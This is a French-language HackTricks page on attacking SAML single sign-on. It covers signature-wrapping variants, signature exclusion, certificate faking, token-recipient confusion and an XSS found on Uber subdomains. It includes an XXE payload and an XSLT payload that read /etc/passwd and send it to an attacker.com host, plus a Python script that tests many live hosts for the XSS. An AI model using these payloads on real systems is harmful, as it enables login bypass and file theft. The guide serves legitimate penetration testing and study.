# Attaques SAML

## Attaques SAML

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## Graphique des attaques

![](<../../.gitbook/assets/image (535) (1) (1) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (13).png>)

## Outil

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) : Un outil qui peut prendre une URL ou une liste d'URL et renvoie l'URL de consommation SAML.

## Aller-retour XML

Dans XML, la partie sign√©e du XML est sauvegard√©e en m√©moire, puis un encodage/d√©codage est effectu√© et la signature est v√©rifi√©e. Id√©alement, cet encodage/d√©codage ne devrait pas modifier les donn√©es mais, dans ce sc√©nario, **les donn√©es v√©rifi√©es et les donn√©es originales pourraient ne pas √™tre les m√™mes**.

Par exemple, v√©rifiez le code suivant :
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
L'ex√©cution du programme avec REXML 3.2.4 ou une version ant√©rieure donnerait plut√¥t la sortie suivante :
```
First child in original doc: Y
First child after round-trip: Z
```
Voici comment REXML a vu le document XML original √† partir du programme ci-dessus :

![](<../../.gitbook/assets/image (561).png>)

Et voici comment il l'a vu apr√®s un cycle de parsing et de s√©rialisation :

![](<../../.gitbook/assets/image (562).png>)

Pour plus d'informations sur la vuln√©rabilit√© et comment l'exploiter :

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## Attaques par Enveloppement de Signature XML

Les documents XML contenant des Signatures XML sont typiquement **trait√©s en deux √©tapes ind√©pendantes** : **validation de la signature** et **invocation de fonction** (logique m√©tier). Si les deux modules ont des visions diff√©rentes des donn√©es, une nouvelle classe de vuln√©rabilit√©s nomm√©e attaques par Enveloppement de Signature XML (XSW) existe.\
Dans ces attaques, l'**adversaire modifie** la **structure du message** en **injectant** des √©l√©ments **falsifi√©s qui n'invalident pas la Signature XML**. Le but de cette alt√©ration est de changer le message de telle mani√®re que la **logique de l'application et le module de v√©rification de la signature utilisent diff√©rentes parties du message**. Par cons√©quent, le r√©cepteur v√©rifie la Signature XML avec succ√®s mais la logique de l'application traite l'√©l√©ment frauduleux. L'**attaquant contourne ainsi la protection de l'int√©grit√©** et l'authentification de l'origine de la Signature XML et peut injecter un contenu arbitraire.

Depuis la requ√™te SAML :

![](<../../.gitbook/assets/image (537).png>)

### XSW #1

Un attaquant peut **ajouter un nouvel √©l√©ment racine o√π la signature** se trouve. Ainsi, lorsque le validateur v√©rifie l'int√©grit√© de la signature, il peut noter qu'il a **v√©rifi√©** l'**int√©grit√©** de **Response -> Assertion -> Subject**, et il pourrait se confondre avec le chemin **malveillant Response -> Assertion -> Subject** en rouge et utiliser ses donn√©es.

![](<../../.gitbook/assets/image (538).png>)

### XSW #2

La diff√©rence avec le #1 est que le type de Signature utilis√© est une **signature d√©tach√©e** o√π XSW #1 utilisait une signature enveloppante.\
Notez comment la nouvelle structure malveillante est la m√™me qu'avant, essayant de confondre la logique m√©tier apr√®s que le contr√¥le d'int√©grit√© a √©t√© effectu√©.

![](<../../.gitbook/assets/image (539).png>)

### XSW #3

Dans cette attaque, une **Assertion malveillante est cr√©√©e au m√™me niveau** que l'assertion originale pour essayer de confondre la logique m√©tier et utiliser les donn√©es malveillantes.

![](<../../.gitbook/assets/image (540).png>)

### XSW #4

XSW #4 est similaire √† #3, sauf que dans ce cas, l'**Assertion originale devient un enfant** de l'Assertion copi√©e.

![](<../../.gitbook/assets/image (541).png>)

### XSW #5

Dans XSW #5, la Signature et l'Assertion originale ne sont pas dans l'une des trois configurations standard (envelopp√©e/enveloppante/d√©tach√©e). Dans ce cas, l'Assertion copi√©e enveloppe la Signature.

![](<../../.gitbook/assets/image (542).png>)

### XSW #6

XSW #6 ins√®re son Assertion copi√©e au m√™me emplacement que les num√©ros 4 et 5. La particularit√© ici est que l'Assertion copi√©e enveloppe la Signature, qui √† son tour enveloppe l'Assertion originale.

![](<../../.gitbook/assets/image (543).png>)

### XSW #7

XSW #7 ins√®re un √©l√©ment **Extensions** et ajoute l'**Assertion** copi√©e comme **enfant**. Extensions est un √©l√©ment XML valide avec une **d√©finition de sch√©ma moins restrictive**. Les auteurs de ce [livre blanc](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf) ont d√©velopp√© cette m√©thode en r√©ponse √† la biblioth√®que OpenSAML. OpenSAML utilisait la validation de sch√©ma pour comparer correctement l'ID utilis√© pendant la validation de la signature √† l'ID de l'Assertion trait√©e. Les auteurs ont trouv√© que dans les cas o√π des Assertions copi√©es avec le m√™me ID que l'Assertion originale √©taient enfants d'un √©l√©ment avec une d√©finition de sch√©ma moins restrictive, ils pouvaient contourner cette contre-mesure particuli√®re.

![](<../../.gitbook/assets/image (544).png>)

### XSW #8

XSW #8 utilise un autre √©l√©ment XML **moins restrictif** pour effectuer une variation du mod√®le d'attaque utilis√© dans XSW #7. Cette fois, l'Assertion originale est l'enfant de l'√©l√©ment moins restrictif au lieu de l'Assertion copi√©e.

![](<../../.gitbook/assets/image (545).png>)

### Outil

Vous pouvez utiliser l'extension Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) pour analyser la requ√™te, appliquer l'attaque XSW de votre choix et la lancer.

![](<../../.gitbook/assets/image (546).png>)

### Article Original

Pour plus d'informations sur cette attaque, lisez l'article original sur [https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)

## XXE

Si vous ne savez pas quels types d'attaques sont les XXE, veuillez lire la page suivante :

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

√âtant donn√© que les R√©ponses SAML sont des **documents XML** d√©compress√©s et encod√©s en base64, nous pouvons tester les **XXE** en manipulant le document XML envoy√© comme R√©ponse SAML. Exemple :
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
### Outil

Vous pouvez √©galement utiliser l'extension Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) pour g√©n√©rer le POC √† partir d'une requ√™te SAML afin de tester d'√©ventuelles vuln√©rabilit√©s XXE.

Consultez √©galement cette conf√©rence : [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT via SAML

Pour plus d'informations sur XSLT, consultez :

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

La transformation de langage de feuilles de style extensible (XSLT) est un langage complet de Turing pour transformer des documents XML en d'autres types de documents tels que HTML, JSON ou PDF. Un aspect important √† noter ici est que **l'attaque ne n√©cessite pas une signature valide pour r√©ussir**. La raison en est que **la transformation XSLT se produit avant que la signature num√©rique ne soit trait√©e pour v√©rification**. En gros, nous avons besoin d'une r√©ponse SAML sign√©e pour r√©aliser l'attaque, mais la signature peut √™tre auto-sign√©e ou invalide.

![xslt](https://epi052.gitlab.io/notes-to-self/img/saml/xslt.png)

Ici, vous pouvez trouver un **POC** pour v√©rifier ce type de vuln√©rabilit√©s, sur la page hacktricks mentionn√©e au d√©but de cette section, vous pouvez trouver des payloads.
```markup
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### Outil

Vous pouvez √©galement utiliser l'extension Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) pour g√©n√©rer le POC √† partir d'une requ√™te SAML pour tester d'√©ventuelles vuln√©rabilit√©s XSLT.

Consultez √©galement cette conf√©rence : [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## Exclusion de Signature XML <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

L'Exclusion de Signature est utilis√©e pour tester le comportement de l'impl√©mentation SAML lorsqu'il n'y a **pas d'√©l√©ment Signature**. Lorsqu'un √©l√©ment Signature est **absent**, l'√©tape de **validation de la signature peut √™tre enti√®rement omise**. Si la Signature n'est pas valid√©e, alors tout contenu qui serait typiquement sign√© peut √™tre alt√©r√© par un attaquant.

![](<../../.gitbook/assets/image (547).png>)

### Outil <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

L'exclusion de signature commence par intercepter la r√©ponse SAML puis en cliquant sur `Remove Signatures`. Ce faisant, **tous** les √©l√©ments Signature sont supprim√©s.

![sig-exclusion](https://epi052.gitlab.io/notes-to-self/img/saml/sig-exclusion.png)

Avec les signatures supprim√©es, laissez la requ√™te se poursuivre vers la cible. Si la Signature n'est pas requise par le Service

## Falsification de Certificat <a href="#certificate-faking" id="certificate-faking"></a>

La falsification de certificat est le processus de test pour d√©terminer si le Fournisseur de Service **v√©rifie qu'un Fournisseur d'Identit√© de confiance a sign√© le Message SAML.** La relation de confiance entre le SP et l'IdP est √©tablie et **doit √™tre v√©rifi√©e** √† chaque r√©ception d'un Message SAML. Cela revient √† utiliser un certificat **auto-sign√©** pour signer la R√©ponse SAML ou l'Assertion.

### Outil <a href="#certificate-faking-how-to" id="certificate-faking-how-to"></a>

L'extension Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) sera utilis√©e.\
Pour falsifier un certificat, commencez par intercepter la r√©ponse SAML.\
S'il y a une Signature incluse dans la R√©ponse, utilisez le bouton `Send Certificate to SAML Raider Certs`.

![send-cert](https://epi052.gitlab.io/notes-to-self/img/saml/send-cert.png)

Apr√®s avoir envoy√© le certificat, nous devrions voir un certificat import√© dans l'onglet Certificats de SAML Raider. Une fois l√†, nous mettons en surbrillance le certificat import√© et appuyons sur le bouton `Save and Self-Sign`.

![sent-cert](https://epi052.gitlab.io/notes-to-self/img/saml/sent-cert.png)

Cela g√©n√®re un clone auto-sign√© du certificat original. Il est maintenant temps de revenir √† la requ√™te intercept√©e toujours retenue dans le Proxy de burp. Tout d'abord, s√©lectionnez le nouveau certificat auto-sign√© dans le menu d√©roulant Signature XML. Ensuite, utilisez le bouton `Remove Signatures` pour supprimer toutes les signatures existantes. Enfin, utilisez le bouton **`(Re-)Sign Message`** ou `(`**`Re-)Sign Assertion`** (**selon ce qui est** **plus** **appropri√©** dans votre situation donn√©e).

![remove-sig](https://epi052.gitlab.io/notes-to-self/img/saml/remove-sig.png)

Apr√®s avoir sign√© le message avec le certificat auto-sign√©, envoyez-le. Si nous nous authentifions, nous savons que nous pouvons signer nos Messages SAML. La capacit√© de signer nos Messages SAML signifie que nous pouvons modifier les valeurs dans l'Assertion et elles seront accept√©es par le Fournisseur de Service.

## Confusion du Destinataire du Token / Confusion de la Cible du Fournisseur de Service <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

La Confusion du Destinataire du Token / Confusion de la Cible du Fournisseur de Service **teste si le Fournisseur de Service valide le Destinataire**. Cela signifie que **si la r√©ponse √©tait destin√©e √† un autre Fournisseur de Service**, le Fournisseur de Service **actuel** devrait le remarquer et **rejeter l'authentification**.\
Le champ **Recipient** est un attribut de l'√©l√©ment **SubjectConfirmationData**, qui est un enfant de l'√©l√©ment Subject dans une r√©ponse SAML.

> L'√©l√©ment SubjectConfirmationData sp√©cifie des donn√©es suppl√©mentaires qui permettent de confirmer le sujet ou de contraindre les circonstances dans lesquelles l'acte de confirmation du sujet peut avoir lieu. La confirmation du sujet a lieu lorsqu'une partie se fiant cherche √† v√©rifier la relation entre une entit√© pr√©sentant l'assertion (c'est-√†-dire l'entit√© attestante) et le sujet des revendications de l'assertion.

L'attribut Recipient trouv√© sur l'√©l√©ment **SubjectConfirmationData est une URL qui sp√©cifie l'emplacement auquel l'Assertion doit √™tre livr√©e**. Si le Recipient est un Fournisseur de Service diff√©rent de celui qui le re√ßoit, l'Assertion ne devrait pas √™tre accept√©e.

### Comment faire <a href="#token-recipient-confusion-how-to" id="token-recipient-confusion-how-to"></a>

La Confusion du Destinataire du Token SAML (SAML-TRC) a quelques conditions pr√©alables pour que nous puissions tenter l'exploitation. Tout d'abord, nous **devons** avoir un **compte l√©gitime sur un Fournisseur de Service**. Deuxi√®mement, **SP-Target doit accepter les tokens √©mis par le m√™me Fournisseur d'Identit√© qui sert SP-Legit**.

L'attaque est relativement simple si les conditions sont vraies. Nous **nous authentifions** aupr√®s de **SP-Legit** via le Fournisseur d'Identit√© partag√©. Nous **interceptons ensuite la r√©ponse SAML en cours de route de l'IdP √† SP-Legit**. Une fois intercept√©e, nous envoyons la **r√©ponse SAML qui √©tait destin√©e √† SP-Legit √† SP-Target √† la place.** Si **SP-Target accepte l'Assertion** ; nous nous retrouverons connect√©s avec le m√™me nom de compte que nous avons pour SP-Legit et obtiendrons l'acc√®s aux ressources correspondantes de SP-Target.

## XSS dans la fonctionnalit√© de d√©connexion

(Acc√©dez √† la [recherche originale ici](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/))

Apr√®s avoir effectu√© le brute forcing de r√©pertoire, j'ai trouv√© la page suivante :
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
C'est une page de d√©connexion, j'ai ouvert le lien ci-dessus et cela m'a redirig√© vers la page suivante
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
Le param√®tre de base prend une URL, alors que diriez-vous de le remplacer par le vieux classique `javascript:alert(123);` pour d√©clencher une XSS.

### Exploitation de masse

En utilisant [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) qui peut prendre une liste d'URLs et ensuite vous renvoyer l'URL de callback (consommation SAML), j'ai d√©cid√© de nourrir l'outil avec tous les sous-domaines de `uberinternal.com` pour voir s'il y avait d'autres domaines utilisant la m√™me biblioth√®que, et c'√©tait le cas.

Ce que j'ai fait ensuite, c'√©tait de cr√©er un script qui appelle la page vuln√©rable `oidauth/prompt` et essaie la XSS et si ma saisie est refl√©t√©e, il me donne un joli message indiquant une vuln√©rabilit√©.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## R√©f√©rences

Les attaques ont √©t√© obtenues √† partir de [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\
Vous pouvez trouver des ressources suppl√©mentaires et des comptes-rendus dans [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
